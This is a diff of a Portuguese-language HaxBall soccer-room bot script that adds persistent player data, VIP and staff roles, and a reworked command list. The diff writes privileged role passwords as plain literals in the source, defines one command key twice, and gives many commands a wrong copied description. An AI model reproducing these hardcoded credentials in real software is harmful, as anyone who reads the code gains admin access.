:0.1,"trait":"ballArea","vis":false,"curve":0}],"traits":{"ballArea":{"vis":false,"bCoef":1,"cMask":["ball"]},"goalPost":{"radius":8,"invMass":0,"bCoef":0.5},"goalNet":{"vis":true,"bCoef":0.1,"cMask":["ball"]},"line":{"vis":true,"bCoef":0.1,"cMask":[""]},"kickOffBarrier":{"vis":false,"bCoef":0.1,"cGroup":["redKO","blueKO"],"cMask":["red","blue"]}
+    },"playerPhysics":{"bCoef":0,"acceleration":0.11,"kickingAcceleration":0.083,"kickStrength":5},"ballPhysics":{"radius":6.25,"bCoef":0.4,"invMass":1.5,"damping":0.99,"color":"FFCC00"}
+    }`;
 
-const account = {}, confirm = [];
+var statsplayer = JSON.parse(localStorage.getItem(`statsplayer`)) || {}; // busca stats dos players
+var contas = JSON.parse(localStorage.getItem("contas")) || []
+var account = contas[0] || {}, confirm = [];
+var astrosstorage = JSON.parse(localStorage.getItem("astros")) || []; // busca os astros dos players
+var astros = astrosstorage[0] || {}
+var tagsstorage = JSON.parse(localStorage.getItem("tags")) || []; // busca tags
+var tags = tagsstorage[0] || {}; // busca tags
+var minhastagsstorage = JSON.parse(localStorage.getItem("minhastags")) || []; // busca tags
+var minhastags = minhastagsstorage[0] || {}
+var minhascoresstorage = JSON.parse(localStorage.getItem("minhascores")) || []; // busca cores
+var minhascores = minhascoresstorage[0] || {}
+var cordochatstorage = JSON.parse(localStorage.getItem("cordochat")) || [];
+var cordochat = cordochatstorage[0] || {}
+var infovipstorage = JSON.parse(localStorage.getItem("infovip")) || []; //  Informações sobre vip
+var infovip = infovipstorage[0] || {}; //  Informações sobre vip
+var codigos = JSON.parse(localStorage.getItem("codigos")) || []; //  Jogadores Vips
+var vipnames = { 1: 'Comum', 2: 'Terráqueo', 3: 'Estelar', 4: 'Galáctico' }
+var tentativasvip = []
+var umdia = 1000 * 60 * 60 * 24;
+var autologinstorage = JSON.parse(localStorage.getItem("autologin")) || [];
+var autologin = autologinstorage[0] || {}
+var connautologin = '';
+var authautologin = '';
+var apostared = {};
+var apostablue = {};
+var apostas = false;
+var vipPausou = [];
+var bloquear_comando = [];
+
+const jogadoresRoom = [];
+
+var authbanida = []; //  auth banida
+var connbanida = []; //  conn banida
+var ipbanido = []; //  ip banida
+var nomebanido = []; //  nome banida
+
+var banidosstorage = JSON.parse(localStorage.getItem("banidos")) || [];
+var banidos = banidosstorage[0] || {}
+
+const dadosjogadoresstorage = JSON.parse(localStorage.getItem("dadosjogadores")) || []; //  Busca dados dos jogadores
+var dadosjogadores = dadosjogadoresstorage[0] || {}
 
 room.setScoreLimit(scoreLimit);
 room.setTimeLimit(timeLimit);
 room.setTeamsLock(true);
 room.setKickRateLimit(6, 0, 0);
 
-var masterPassword = "alekMaster";
+var masterPassword = "%!%@@@FundadorPassword|__";
+var donoPassword = "&&$%_DonoPassword_$%&&";
+var diretorPassword = "#@%&#%Diretor__";
+var gerentePassword = "&*¨(#%¨Gerente";
 var adminPassword = getRandomInt2(10000, 99999);
 var modsPassword = getRandomInt2(10000, 599999);
-
-console.log(masterPassword);
-console.log(adminPassword);
 
 var vip1Password = getRandomInt2(10000, 99999);
 var vip2Password = getRandomInt2(100000, 299999);
 var vip3Password = getRandomInt2(200000, 399999);
 var vip4Password = getRandomInt2(300000, 499999);
+
 var roomPassword = '';
 var tipoVip = 0
 var streakMax = 0
 var streakRecord = 0
 var lastTeamStreak = []
+var odred = 0
+var odblue = 0
 /* OPTIONS */
 
 var drawTimeLimit = 1;
@@ -5484,7 +829,7 @@ class Game {
         this.scores = room.getScores();
         this.playerComp = getStartingLineups();
         this.goals = [];
-        //this.rec = room.startRecording();
+        this.rec = room.startRecording();
         this.touchArray = [];
     }
 }
@@ -5612,7 +957,7 @@ class HaxStatistics {
 
 const Team = { SPECTATORS: 0, RED: 1, BLUE: 2 };
 const State = { PLAY: 0, PAUSE: 1, STOP: 2 };
-const Role = { PLAYER: 0, ADMIN_TEMP: 1, ADMIN_PERM: 2, MASTER: 3 };
+const Role = { PLAYER: 0, MOD: 1, ADMIN: 2, GERENTE: 3, MASTER: 4 };
 const HaxNotification = { NONE: 0, CHAT: 1, MENTION: 2 };
 const Situation = { STOP: 0, KICKOFF: 1, PLAY: 2, GOAL: 3 };
 
@@ -5630,7 +975,6 @@ var teamRedStats = [];
 var teamBlueStats = [];
 
 var banList = [];
-var jogadoresRoom = [];
 
 /* STATS */
 
@@ -5643,13 +987,44 @@ var streak = 0;
 
 var authArray = {};
 var masterList = [];
+var donoList = [];
+var diretores = [];
+var gerentes = [];
 var adminList = [];
 var mods = [];
+var dono = [];
+var gerente = [];
 
-var vips = [];
+// modoPosicao = false
+// escolheramPosicao = []
+// var comandosPosicoes = ['GK', 'LD', 'LE', 'VL', 'MC', 'PD', 'PE']
+// var posicoesPreenchidasRed = {
+//     GK: false,
+//     LD: false,
+//     LE: false,
+//     VL: false,
+//     MC: false,
+//     PD: false,
+//     PE: false
+// }
+// var posicoesPreenchidasBlue = {
+//     GK: false,
+//     LD: false,
+//     LE: false,
+//     VL: false,
+//     MC: false,
+//     PD: false,
+//     PE: false
+// }
+
+var chuteira = [];
+var luva = [];
+var garcom = [];
 var puskas = [];
+var buskas = [];
 var goldBall = [];
-
+var vipsdb = JSON.parse(localStorage.getItem("vips")) || []
+var vips = vipsdb[0] || {}; //  Jogadores Vips
 var goalAttribution = 0;
 var modoVoteBan = false;
 var votosBan = 0;
@@ -5666,50 +1041,50 @@ var commands = {
         aliases: ['commands'],
         roles: Role.PLAYER,
         desc: `
-	Este comando mostra todos os comandos disponíveis. Ele também pode mostrar a descrição de um comando em particular.
-Exemplo: '!ajuda bb' mostrará a descrição do comando 'bb'.`,
+    Este comando mostra todos os comandos disponíveis. Ele também pode mostrar a descrição de um comando em particular.
+    Exemplo: '!ajuda bb' mostrará a descrição do comando 'bb'.`,
         function: helpCommand,
     },
     discord: {
-        aliases: ['ds', 'dc'], // Bot desenvolvido pelo OBL
+        aliases: ['ds', 'dc'],
         roles: Role.PLAYER,
         desc: `
-        Este comando envia o link de convite para o nosso discord.`,
+            Este comando envia o link de convite para o nosso discord.`,
         function: sendLinkDiscord,
     },
     pv: {
         aliases: ['pm'],
         roles: Role.PLAYER,
         desc: `
-        Este comando envia mensagem privada para outro jogador. Para usar digite !pv #id mensagem (utilize # para pegar o id)`,
+            Este comando envia mensagem privada para outro jogador. Para usar digite !pv id mensagem (utilize !ids para pegar o id)`,
         function: playerChat,
     },
     calladmin: {
         aliases: [],
-        roles: Role.PLAYER, // Bot desenvolvido pelo OBL
+        roles: Role.PLAYER,
         desc: `
-	Este comando chamará um administrador no discord, com uma mensagem opcional. Exemplo: !calladminh Adm vem banir um racista pfvr`,
+    Este comando chamará um administrador no discord, com uma mensagem opcional. Exemplo: !calladminh Adm vem banir um racista pfvr`,
         function: callAdmin,
     },
     registrar: {
         aliases: [],
         roles: Role.PLAYER,
         desc: `
-        Cria a sua conta`,
+            Cria a sua conta`,
         function: registrar,
     },
     login: {
         aliases: [],
         roles: Role.PLAYER,
         desc: `
-        Loga na sua conta.`,
+            Loga na sua conta.`,
         function: login,
     },
     mudarsenha: {
         aliases: [],
         roles: Role.PLAYER,
         desc: `
-        Muda a senha da sua conta.`,
+            Muda a senha da sua conta.`,
         function: mudarSenha,
     },
     voteban: {
@@ -5724,7 +1099,25 @@ Exemplo: '!ajuda bb' mostrará a descrição do comando 'bb'.`,
         desc: ``,
         function: voteMute,
     },
-    claim: {
+    fundador: {
+        aliases: [],
+        roles: Role.PLAYER,
+        desc: false,
+        function: fundadorCommand,
+    },
+    dono: {
+        aliases: [],
+        roles: Role.PLAYER,
+        desc: false,
+        function: donoCommand,
+    },
+    mod: {
+        aliases: [],
+        roles: Role.PLAYER,
+        desc: false,
+        function: modCommand,
+    },
+    fundador: {
         aliases: [],
         roles: Role.PLAYER,
         desc: false,
@@ -5734,19 +1127,7 @@ Exemplo: '!ajuda bb' mostrará a descrição do comando 'bb'.`,
         aliases: [],
         roles: Role.PLAYER,
         desc: false,
-        function: adminCommand, // Bot desenvolvido pelo OBL
-    },
-    mod: {
-        aliases: [],
-        roles: Role.PLAYER,
-        desc: false,
-        function: modCommand,
-    },
-    rr2: {
-        aliases: [],
-        roles: Role.MOD,
-        desc: `Coloca a bola no centro do mapa`,
-        function: rr2Command
+        function: adminCommand,
     },
     vip: {
         aliases: [],
@@ -5758,101 +1139,109 @@ Exemplo: '!ajuda bb' mostrará a descrição do comando 'bb'.`,
         aliases: [],
         roles: Role.PLAYER,
         desc: `
-        Este comando faz você ficar AFK.
-    Tem restrições: 1 minuto mínimo de tempo de AFK, 5 minutos no máximo e 10 minutos de cooldown.`,
+            Este comando faz você ficar AFK.
+        Tem restrições: 1 minuto mínimo de tempo de AFK, 5 minutos no máximo e 10 minutos de cooldown.`,
         function: afkCommand,
     },
     afks: {
         aliases: ['afklist'],
         roles: Role.PLAYER,
         desc: `
-        Este comando mostra todos os jogadores que estão AFK.`,
+            Este comando mostra todos os jogadores que estão AFK.`,
         function: afkListCommand,
     },
     bb: {
         aliases: ['bye'],
         roles: Role.PLAYER,
         desc: `
-	Este comando faz você sair instantaneamente (uso recomendado).`,
+    Este comando faz você sair instantaneamente (uso recomendado).`,
         function: leaveCommand,
     },
-    uni: { // Bot desenvolvido pelo OBL
+    unis: {
         aliases: ['uniformes', 'unis', 'camisas', 'camisetas'],
         roles: Role.PLAYER,
         desc: `
-	Este comando exibe categorias de uniformes disponiveis.`,
+    Este comando exibe categorias de uniformes disponiveis.`,
         function: mostraUnisCategorias,
     },
     selecoes: {
         aliases: ['sele', 'sel'],
         roles: Role.PLAYER,
         desc: `
-	Este comando exibe uniformes de selecões disponiveis.`,
+    Este comando exibe uniformes de selecões disponiveis.`,
         function: mostraUnisSelecoes,
     },
     brasileiros: {
         aliases: [],
-        roles: Role.PLAYER, // Bot desenvolvido pelo OBL
+        roles: Role.PLAYER,
         desc: `
-	Este comando exibe uniformes brasileiros disponiveis.`,
+    Este comando exibe uniformes brasileiros disponiveis.`,
         function: mostraUnisBrasileiros,
     },
     outros: {
         aliases: [],
         roles: Role.PLAYER,
         desc: `
-	Este comando exibe outros uniformes brasileiros disponiveis.`,
+    Este comando exibe outros uniformes brasileiros disponiveis.`,
         function: mostraUnisOutros,
-    },
-    creditos: {
-        aliases: ['credits', 'obl', 'script'],
-        roles: Role.PLAYER,
-        desc: `Este comando mostra as informações sobre o desenvolvedor do script`,
-        function: credits,
     },
     estrangeiros: {
         aliases: [],
         roles: Role.PLAYER,
         desc: `
-	Este comando exibe uniformes estrangeiros disponiveis.`,
+    Este comando exibe uniformes estrangeiros disponiveis.`,
         function: mostraUnisEstrangeiros,
     },
-    especiais: {
+    vipuni: {
         aliases: [],
         roles: Role.PLAYER,
         desc: `
-	Este comando exibe uniformes especiais disponiveis.`, // Bot desenvolvido pelo OBL
-        function: mostraUnisEspeciais,
+    Este comando exibe uniformes especiais disponiveis.`,
+        function: mostraUnisvipuni,
+    },
+    uniespeciais: {
+        aliases: [],
+        roles: Role.PLAYER,
+        desc: `
+    Este comando exibe uniformes vips especiais disponiveis.`,
+        function: mostraUnisvipuniEspeciais,
+    },
+    novos: {
+        aliases: ['news', 'uninovos'],
+        roles: Role.PLAYER,
+        desc: `
+    Este comando exibe uniformes novos.`,
+        function: mostraUnisNovos,
     },
     provos: {
         aliases: [],
         roles: Role.PLAYER,
         desc: `
-	Este comando exibe uniformes de selecões disponiveis.`,
+    Este comando exibe uniformes de selecões disponiveis.`,
         function: mostraProvocacoes,
     },
     me: {
         aliases: ['mestat', 'mestats'],
         roles: Role.PLAYER,
         desc: `
-        Este comando mostra suas estatísticas globais na sala para tu somente.`,
-        function: globalStatsCommandMe, // Bot desenvolvido pelo OBL
+            Este comando mostra suas estatísticas globais na sala para Você somente.`,
+        function: globalStatsCommandMe,
     },
     mostrarstats: {
         aliases: ['stat', 'stats', 'mostrarstat'],
         roles: Role.PLAYER,
         desc: `
-        Este comando mostra suas estatísticas globais na sala para todos.`,
+            Este comando mostra suas estatísticas globais na sala para todos.`,
         function: globalStatsCommand,
     },
     resetar: {
         aliases: [],
         roles: Role.PLAYER,
         desc: `
-        Este comando reseta todas as tuas estatísticas.`,
+            Este comando reseta todas as tuas estatísticas.`,
         function: resetarStats,
     },
-    streak: { // Bot desenvolvido pelo OBL
+    streak: {
         aliases: ['streaks'],
         roles: Role.PLAYER,
         desc: false,
@@ -5862,221 +1251,321 @@ Exemplo: '!ajuda bb' mostrará a descrição do comando 'bb'.`,
         aliases: ['rankinfo'],
         roles: Role.PLAYER,
         desc: `
-	Este comando mostra todos os ranks disponiveis no servidor VorteX. Ele também explica os requesitos para upar de rank.`,
+    Este comando mostra todos os ranks disponiveis no servidor. Ele também explica os requesitos para upar de rank.`,
         function: rankInfo,
     },
     pontos: {
         aliases: ['ponto'],
-        roles: Role.PLAYER, // Bot desenvolvido pelo OBL
+        roles: Role.PLAYER,
         desc: `
-	Este comando mostra seus pontos no servidor VorteX. Ele também explica os requesitos para adquirir pontos.`,
+    Este comando mostra seus pontos no servidor. Ele também explica os requesitos para adquirir pontos.`,
         function: pontos,
     },
     renomear: {
         aliases: [],
         roles: Role.PLAYER,
         desc: `
-        Este comando permite que você se renomeie para a tabela de classificação.`,
+            Este comando permite que você se renomeie para a tabela de classificação.`,
         function: renameCommand,
     },
     jogos: {
         aliases: [],
         roles: Role.PLAYER,
         desc: `
-        Este comando mostra os 5 melhores jogadores com mais jogos na sala.`,
+            Este comando mostra os 5 melhores jogadores com mais jogos na sala.`,
         function: statsLeaderboardCommand,
     },
     vitorias: {
         aliases: [],
         roles: Role.PLAYER,
         desc: `
-        Este comando mostra os 5 melhores jogadores com mais vitórias na sala.`,
+            Este comando mostra os 5 melhores jogadores com mais vitórias na sala.`,
         function: statsLeaderboardCommand,
     },
     gols: {
         aliases: [],
         roles: Role.PLAYER,
         desc: `
-        Este comando mostra os 5 melhores jogadores com mais gols na sala.`,
+            Este comando mostra os 5 melhores jogadores com mais gols na sala.`,
         function: statsLeaderboardCommand,
     },
-    assist: {
+    assists: {
         aliases: ['assistencias', 'assists'],
         roles: Role.PLAYER,
         desc: `
-        Este comando mostra os 5 melhores jogadores com mais assistências na sala.`,
+            Este comando mostra os 5 melhores jogadores com mais assistências na sala.`,
         function: statsLeaderboardCommand,
     },
     cs: {
         aliases: [],
         roles: Role.PLAYER,
         desc: `
-        Este comando mostra os 5 melhores jogadores com mais CS na sala.`,
-        function: statsLeaderboardCommand, // Bot desenvolvido pelo OBL
+            Este comando mostra os 5 melhores jogadores com mais CS na sala.`,
+        function: statsLeaderboardCommand,
+    },
+    astros: {
+        aliases: [],
+        roles: Role.PLAYER,
+        desc: `
+            Este comando mostra quantas moedas "Astros" você possui.`,
+        function: showAstros,
+
+    },
+    tag: {
+        aliases: [],
+        roles: Role.PLAYER,
+        desc: `
+            Este comando muda a TAG que você possui.`,
+        function: mudarTag,
+    },
+    tirartag: {
+        aliases: [],
+        roles: Role.PLAYER,
+        desc: `
+            Este comando Exclui a TAG que você possui.`,
+        function: tirarTag,
+    },
+    comprarvip: {
+        aliases: [],
+        roles: Role.PLAYER,
+        desc: `
+            Este comando Exclui a TAG que você possui.`,
+        function: vip,
+    },
+    comprartag: {
+        aliases: [],
+        roles: Role.PLAYER,
+        desc: `
+            Este comando Exclui a TAG que você possui.`,
+        function: comprartag,
+    },
+    minhastags: {
+        aliases: [],
+        roles: Role.PLAYER,
+        desc: `
+            Este comando Exclui a TAG que você possui.`,
+        function: minhasTags,
+    },
+    minhascores: {
+        aliases: [],
+        roles: Role.PLAYER,
+        desc: `
+            Este comando Exclui a TAG que você possui.`,
+        function: minhasCores,
+    },
+    comprarcor: {
+        aliases: [],
+        roles: Role.PLAYER,
+        desc: `
+            Este comando Exclui a TAG que você possui.`,
+        function: comprarCor,
+    },
+    tirarcor: {
+        aliases: [],
+        roles: Role.PLAYER,
+        desc: `
+            Este comando Exclui a TAG que você possui.`,
+        function: tirarCor,
+    },
+    infovip: {
+        aliases: [],
+        roles: Role.PLAYER,
+        desc: `
+            Este comando Exclui a TAG que você possui.`,
+        function: infoVip,
+    },
+    ids: {
+        aliases: [],
+        roles: Role.PLAYER,
+        desc: `
+            Este comando Exclui a TAG que você possui.`,
+        function: buscarIds,
+    },
+    tirarvip: {
+        aliases: [],
+        roles: Role.MASTER,
+        desc: `
+            Este comando Exclui a TAG que você possui.`,
+        function: tirarVip,
+    },
+    desban: {
+        aliases: ['desbanir'],
+        roles: Role.ADMIN,
+        desc: `
+            Este comando Exclui a TAG que você possui.`,
+        function: desbanir,
+    },
+    infoban: {
+        aliases: [],
+        roles: Role.MOD,
+        desc: `
+            Este comando Exclui a TAG que você possui.`,
+        function: infoban,
+    },
+    pp: {
+        aliases: [],
+        roles: Role.PLAYER,
+        desc: `Este comando despausa um jogo em andamento.`,
+        function: despausarVip,
+    },
+    creditos: {
+        aliases: ['credits'],
+        roles: Role.PLAYER,
+        desc: `Este comando mostra os créditos do script.`,
+        function: credits,
+    },
+    codigo: {
+        aliases: [],
+        roles: Role.MASTER,
+        desc: `
+            Este comando Exclui a TAG que você possui.`,
+        function: codigo,
+    },
+    receber: {
+        aliases: [],
+        roles: Role.PLAYER,
+        desc: `
+            Este comando Exclui a TAG que você possui.`,
+        function: receber,
+    },
+    adm: {
+        aliases: [],
+        roles: Role.MOD,
+        desc: `
+            Este comando Exclui a TAG que você possui.`,
+        function: pegarAdmin,
+    },
+    apostar: {
+        aliases: [],
+        roles: Role.PLAYER,
+        desc: `
+            Este comando Exclui a TAG que você possui.`,
+        function: apostar,
+    },
+    autologin: {
+        aliases: [],
+        roles: Role.PLAYER,
+        desc: `
+            Este comando Exclui a TAG que você possui.`,
+        function: autoLogin,
     },
     map1: {
         aliases: [],
-        roles: Role.ADMIN_TEMP,
+        roles: Role.ADMIN,
         desc: `
-        Este comando carrega o grande estádio.`,
+            Este comando carrega o grande estádio.`,
         function: stadiumCommand,
     },
     rr: {
         aliases: [],
-        roles: Role.ADMIN_PERM,
+        roles: Role.MOD,
         desc: `
-    Este comando reinicia o jogo.`,
+        Este comando reinicia o jogo.`,
         function: restartCommand,
+    },
+    rr2: {
+        aliases: [],
+        roles: Role.MOD,
+        desc: `Coloca a bola no centro do mapa`,
+        function: rr2Command
+    },
+    sorteio: {
+        aliases: ['sortear'],
+        roles: Role.PLAYER,
+        desc: false,
+        function: sorteio,
     },
     mutar: {
         aliases: ['m'],
-        roles: Role.ADMIN_PERM,
+        roles: Role.MOD,
         desc: `
-        Este comando permite silenciar um jogador. Ele não poderá falar por um determinado período e pode ser ativado a qualquer momento pelos administradores.
-    São necessários 2 argumentos:
-    Argumento 1: #<id> onde <id> é o id do jogador alvo. Isso não funcionará se o jogador for um administrador.
-    Argumento 2 (opcional): <duration> onde <duration> é a duração do mute em minutos. Se nenhum valor for fornecido, o silêncio dura a duração padrão, ${muteDuration} minutos.
-    Exemplo: !mute #3 20 irá silenciar o player com id 3 por 20 minutos.`,
+            Este comando permite silenciar um jogador. Ele não poderá falar por um determinado período e pode ser ativado a qualquer momento pelos administradores.
+        São necessários 2 argumentos:
+        Argumento 1: <id> onde <id> é o id do jogador alvo. Isso não funcionará se o jogador for um administrador.
+        Argumento 2 (opcional): <duration> onde <duration> é a duração do mute em minutos. Se nenhum valor for fornecido, o silêncio dura a duração padrão, ${muteDuration} minutos.
+        Exemplo: !mutar 3 20 irá silenciar o player com id 3 por 20 minutos.`,
         function: muteCommand,
     },
     desmutar: {
         aliases: ['um'],
-        roles: Role.ADMIN_PERM, // Bot desenvolvido pelo OBL
+        roles: Role.MOD,
         desc: `
-        Este comando permite ativar o som de alguém.
-    Leva 1 argumento:
-    Argumento 1: #<ID> onde <ID> é o ID do player silenciado.
-    OU
-    Argumento 1: <ID> onde <ID> é o número associado ao mute fornecido pelo comando '!mutados'.
-    Exemplo: !desmutar #300 irá ativar o chat do player com id 300,
-             !desmutar 8 irá ativar o chat do jogador n°8 de acordo com o comando '!mutados'.`,
+            Este comando permite ativar o som de alguém.
+        Leva 1 argumento:
+        Argumento 1: <ID> onde <ID> é o ID do player silenciado.
+        OU
+        Argumento 1: <ID> onde <ID> é o número associado ao mute fornecido pelo comando '!mutados'.
+        Exemplo: !desmutar 300 irá ativar o chat do player com id 300,
+                !desmutar 8 irá ativar o chat do jogador n°8 de acordo com o comando '!mutados'.`,
         function: unmuteCommand,
     },
     mutados: {
         aliases: [],
-        roles: Role.ADMIN_PERM,
+        roles: Role.MOD,
         desc: `
-        Este comando mostra a lista de jogadores silenciados.`,
+            Este comando mostra a lista de jogadores silenciados.`,
         function: muteListCommand,
     },
     clearbans: {
         aliases: [],
-        roles: Role.MASTER,
+        roles: Role.ADMIN,
         desc: `
-	Este comando desbloqueia todos. Ele também pode desbanir um jogador em particular, adicionando seu ID como argumento.`,
+    Este comando desbloqueia todos. Ele também pode desbanir um jogador em particular, adicionando seu ID como argumento.`,
         function: clearbansCommand,
     },
     bans: {
-        aliases: ['banlist'],
-        roles: Role.MASTER,
+        aliases: ['banlist', 'banidos'],
+        roles: Role.MOD,
         desc: `
-    Este comando mostra todos os jogadores que foram banidos e seus IDs.`,
+        Este comando mostra todos os jogadores que foram banidos e seus IDs.`,
         function: banListCommand,
-    },
-    unbanip: {
-        aliases: ['desbanirip', 'clearbansip', 'clearbanip', 'desbanip', 'dbip'],
-        roles: Role.MASTER,
-        desc: `Este comando desbane todos os ip. Ele também pode desbanir um ip em particular, adicionando seu ip como argumento.`,
-        function: ipRemoveCommand,
-    },
-    ips: {
-        aliases: ['ipb', 'ipsbanidos', 'ipsbanido', 'ipbanidos', 'ipbanido'],
-        roles: Role.MASTER,
-        desc: `
-        Este comando mostra todos os ips que foram banidos e seus IDs.`,
-        function: ipBanidoCommand,
-    },
-    unbanconn: {
-        aliases: ['desbanirconn', 'clearbansconn', 'clearbanconn', 'desbanconn', 'dbconn'],
-        roles: Role.MASTER,
-        desc: `Este comando desbane todos as conn. Ele também pode desbanir uma conn em particular, adicionando a conn como argumento.`,
-        function: connRemoveCommand,
-    },
-    conns: {
-        aliases: ['connb', 'connsbanidos', 'connsbanida', 'connsbanidas', 'connbanida'],
-        roles: Role.MASTER,
-        desc: `
-        Este comando mostra todos as conn que foram banidas e seus IDs.`,
-        function: connBanidoCommand,
-    },
-    unbanauth: {
-        aliases: ['desbanirauth', 'clearbansauth', 'clearbanauth', 'desbanauth', 'dbauth'],
-        roles: Role.MASTER,
-        desc: `Este comando desbane todos as auth. Ele também pode desbanir uma conn em particular, adicionando a auth como argumento.`,
-        function: authRemoveCommand,
-    },
-    auths: {
-        aliases: ['auth', 'authb', 'authbanidos', 'authbanida', 'authbanidas', 'authbanida'],
-        roles: Role.MASTER,
-        desc: `
-        Este comando mostra todos as auth que foram banidas e seus IDs.`,
-        function: authBanidoCommand,
     },
     admins: {
         aliases: [],
-        roles: Role.MASTER, // Bot desenvolvido pelo OBL
+        roles: Role.MOD,
         desc: `
-    Este comando mostra todos os jogadores que são administradores permanentes.`,
+        Este comando mostra todos os jogadores que são administradores permanentes.`,
         function: adminListCommand,
+    },
+    odd: {
+        aliases: [],
+        roles: Role.PLAYER,
+        desc: `
+        Este comando mostra todos os jogadores que são administradores permanentes.`,
+        function: updateOD,
     },
     setadmin: {
         aliases: [],
         roles: Role.MASTER,
         desc: `
-    Este comando permite definir alguém como administrador. Ele poderá se conectar como administrador, podendo ser removido a qualquer momento pelos mestres.
-Leva 1 argumento:
-Argumento 1: #<id> onde <id> é o id do jogador alvo.
-Exemplo: !setadmin #3 dará admin ao jogador com id 3.`,
+        Este comando permite definir alguém como administrador. Ele poderá se conectar como administrador, podendo ser removido a qualquer momento pelos mestres.
+    Leva 1 argumento:
+    Argumento 1: <id> onde <id> é o id do jogador alvo.
+    Exemplo: !setadmin 3 dará admin ao jogador com id 3.`,
         function: setAdminCommand,
     },
     removeradmin: {
         aliases: [],
         roles: Role.MASTER,
         desc: `
-    Este comando remove um admin!`,
+        Este comando remove um admin!`,
         function: removerAdmin,
     },
     setvip: {
         aliases: [''],
         roles: Role.MASTER,
         desc: `
-    Este comando permite definir alguém como VIP.
-    Leva 1 argumento:
-    Argumento 1: #<id> onde <id> é o id do jogador alvo.
-    Exemplo: !setvip #3 dará VIP ao jogador com id 3.`,
+        Este comando permite definir alguém como VIP.
+        Leva 1 argumento:
+        Argumento 1: <id> onde <id> é o id do jogador alvo.
+        Exemplo: !setvip 3 dará VIP ao jogador com id 3.`,
         function: setVipCommand,
-    }, // Bot desenvolvido pelo OBL
-    setpuskas: {
-        aliases: [''],
-        roles: Role.MASTER,
-        desc: `
-    Este comando permite definir alguém como Puskás.
-    Leva 1 argumento:
-    Argumento 1: #<id> onde <id> é o id do jogador alvo.
-    Exemplo: !setpuskas #3 dará o cargo Puskás ao jogador com id 3.`,
-        function: setPuskasCommand,
     },
-    setgoldball: {
-        aliases: ['setboladeouro', 'setbolaouro'],
-        roles: Role.MASTER,
-        desc: `
-    Este comando permite definir alguém como um jogador Bola de ouro.
-    Leva 1 argumento:
-    Argumento 1: #<id> onde <id> é o id do jogador alvo.
-    Exemplo: !setgoldball #3 dará o cargo Bola de ouro ao jogador com id 3.`,
-        function: setGoldBallCommand,
-    }, // Bot desenvolvido pelo OBL
-    vips: { // Bot desenvolvido pelo OBL
-        aliases: [''], // Bot desenvolvido pelo OBL
-        roles: Role.MASTER,
+    vips: {
+        aliases: [''],
+        roles: Role.PLAYER,
         desc: false,
         function: showVips,
-    },
-    puskas: { // Bot desenvolvido pelo OBL
-        aliases: [''], // Bot desenvolvido pelo OBL
-        roles: Role.MASTER,
-        desc: false,
-        function: showPuskas,
     },
     removervip: {
         aliases: [''],
@@ -6086,28 +1575,113 @@ Exemplo: !setadmin #3 dará admin ao jogador com id 3.`,
     },
     senha: {
         aliases: ['pw', 'password'],
-        roles: Role.MASTER,
+        roles: Role.ADMIN,
         desc: `
-        Este comando permite adicionar uma senha à sala.
-    Leva 1 argumento:
-    Argumento 1: <password> onde <password> é a senha que você deseja para a sala.
-    
-    Para remover a senha da sala, basta digitar '!password'.`,
+            Este comando permite adicionar uma senha à sala.
+        Leva 1 argumento:
+        Argumento 1: <password> onde <password> é a senha que você deseja para a sala.
+        
+        Para remover a senha da sala, basta digitar '!password'.`,
         function: passwordCommand,
     },
-    ban: {
-        aliases: ['banir', 'bann'],
-        roles: Role.ADMIN_PERM,
-        desc: false,
-        function: banCommand,
+    setpuskas: {
+        aliases: [''],
+        roles: Role.MASTER,
+        desc: `
+        Este comando permite definir alguém como Puskás.
+        Leva 1 argumento:
+        Argumento 1: #<id> onde <id> é o id do jogador alvo.
+        Exemplo: !setpuskas #3 dará o cargo Puskás ao jogador com id 3.`,
+        function: setPuskasCommand,
     },
-    settag: {
-        aliases: [],
+    setchuteira: {
+        aliases: [''],
+        roles: Role.MASTER,
+        desc: `
+        Este comando permite definir alguém como Puskás.
+        Leva 1 argumento:
+        Argumento 1: #<id> onde <id> é o id do jogador alvo.
+        Exemplo: !setpuskas #3 dará o cargo Puskás ao jogador com id 3.`,
+        function: setChuteiraCommand,
+    },
+    setluva: {
+        aliases: [''],
+        roles: Role.MASTER,
+        desc: `
+        Este comando permite definir alguém como Puskás.
+        Leva 1 argumento:
+        Argumento 1: #<id> onde <id> é o id do jogador alvo.
+        Exemplo: !setpuskas #3 dará o cargo Puskás ao jogador com id 3.`,
+        function: setLuvaCommand,
+    },
+    setgarcom: {
+        aliases: [''],
+        roles: Role.MASTER,
+        desc: `
+        Este comando permite definir alguém como Puskás.
+        Leva 1 argumento:
+        Argumento 1: #<id> onde <id> é o id do jogador alvo.
+        Exemplo: !setpuskas #3 dará o cargo Puskás ao jogador com id 3.`,
+        function: setGarcomCommand,
+    },
+    setbuskas: {
+        aliases: [''],
+        roles: Role.MASTER,
+        desc: `
+        Este comando permite definir alguém como Buskás.
+        Leva 1 argumento:
+        Argumento 1: #<id> onde <id> é o id do jogador alvo.
+        Exemplo: !setbuskas #3 dará o cargo Buskás ao jogador com id 3.`,
+        function: setBuskasCommand,
+    },
+    setgoldball: {
+        aliases: ['setboladeouro', 'setbolaouro'],
+        roles: Role.MASTER,
+        desc: `
+        Este comando permite definir alguém como um jogador Bola de ouro.
+        Leva 1 argumento:
+        Argumento 1: #<id> onde <id> é o id do jogador alvo.
+        Exemplo: !setgoldball #3 dará o cargo Bola de ouro ao jogador com id 3.`,
+        function: setGoldBallCommand,
+    }, // Bot desenvolvido pelo OBL
+    puskas: { // Bot desenvolvido pelo OBL
+        aliases: [''], // Bot desenvolvido pelo OBL
         roles: Role.MASTER,
         desc: false,
-        function: setNewTag,
+        function: showPuskas,
+    },
+    buskas: { // Bot desenvolvido pelo OBL
+        aliases: [''], // Bot desenvolvido pelo OBL
+        roles: Role.MASTER,
+        desc: false,
+        function: showBuskas,
+    },
+    chuteiras: { // Bot desenvolvido pelo OBL
+        aliases: [''], // Bot desenvolvido pelo OBL
+        roles: Role.MASTER,
+        desc: false,
+        function: showChuteiras,
+    },
+    luvas: { // Bot desenvolvido pelo OBL
+        aliases: [''], // Bot desenvolvido pelo OBL
+        roles: Role.MASTER,
+        desc: false,
+        function: showLuvas,
+    },
+    garcons: { // Bot desenvolvido pelo OBL
+        aliases: [''], // Bot desenvolvido pelo OBL
+        roles: Role.MASTER,
+        desc: false,
+        function: showGarcons,
     },
 };
+
+async function credits(player) {
+    room.sendAnnouncement(`Créditos do script atual: \n- Van Dijk (Desenvolvedor primário)\n- OBL (Desenvolvedor secundário).`, player.id, cores.branco, 'bold', 3);
+    return false;
+}
+
+// ----------------------------------------
 
 function setPuskasCommand(player, message) {
